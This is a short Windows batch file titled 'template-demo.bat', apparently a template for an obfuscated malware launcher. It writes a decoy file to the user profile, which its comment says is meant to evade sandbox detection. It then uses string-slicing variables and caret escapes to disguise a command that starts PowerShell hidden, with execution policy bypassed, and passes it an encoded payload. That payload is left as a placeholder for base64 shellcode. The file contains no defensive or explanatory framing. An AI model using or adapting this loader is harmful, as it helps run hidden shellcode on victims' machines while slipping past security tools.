::
:: [ template-demo.bat ]
::
@echo off
:: Writte file to disk to evade sandbox detection
echo microsoft > %userprofile%\\license.pem
:: local batch variable declarations
sEt !h=e&& sEt U7=n&& set k8=d
sEt i0=abcdefghijlmnopqrstuvxzkyw
:: Powershell command obfuscated
@c^M%k8%.E"x"%!h% /%i0:~1,1% =P%i0:~12,1%^W%!h%rS%i0:~6,1%%!h%l^L"."%!h%Xe '-'%U7%op "-"wI%U7%%k8% H%i0:~7,1%%k8%D%!h%N '-'%!h%^X'e'%C By%i0:~13,1%A^s%i0:~16,1% "-"%U7%O^n%i0:~7,1% "-"%!h%NC $ENCODED-SHELLCODE-BASE64
exit
